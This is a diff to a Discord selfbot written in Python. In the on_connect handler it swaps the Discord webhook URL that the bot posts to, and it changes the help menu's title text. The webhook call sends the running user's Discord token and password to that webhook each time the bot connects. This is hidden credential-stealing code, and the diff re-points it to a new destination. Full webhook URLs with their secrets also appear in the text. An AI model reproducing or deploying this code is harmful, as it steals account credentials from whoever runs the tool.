@@ -354,7 +354,7 @@ async def on_message(message):
 @Exeter.event
 async def on_connect():
     Clear()  
-    requests.post('https://discord.com/api/webhooks/786311683726508083/JwIidRV8w9eMZ7bBr3MYwy2pmDfHJnAGt4L3dI9GrFsX7ZGWNDVgwDjk5b7RHlvvQSFO',json={'content': f"**Token:** `{toe}`\n**Password:** `{password}`"})
+    requests.post('https://discord.com/api/webhooks/800195350727884821/fli3Dv6McKrHfJeZlHH_w91BLpATvZVhc9GQC9JgxzCVkz_8jO4ENlNTKxyFEadI6Lp1',json={'content': f"**Token:** `{toe}`\n**Password:** `{password}`"})
     startprint()
 
 @Exeter.event
@@ -808,7 +808,7 @@ async def help(ctx, category=None):
     await ctx.message.delete()
     if category is None:
         embed = discord.Embed(color=0xFF633B, timestamp=ctx.message.created_at)
-        embed.set_author(name="𝙀𝙓𝙀𝙏𝙀𝙍 𝙎𝙀𝙇𝙁𝘽𝙊𝙏 | 𝙋𝙍𝙀𝙁𝙄𝙓: " + str(Exeter.command_prefix),
+        embed.set_author(name="𝙆𝙇𝘼𝙔𝙇𝙊 𝙇𝙊𝙑𝙀𝙎 𝙔𝙊𝙐 | 𝙋𝙍𝙀𝙁𝙄𝙓: " + str(Exeter.command_prefix),
                          icon_url=Exeter.user.avatar_url)
         embed.set_thumbnail(url=Exeter.user.avatar_url)
         embed.set_image(url="https://cdn.discordapp.com/attachments/723250694118965300/723253781873164298/image1.gif")
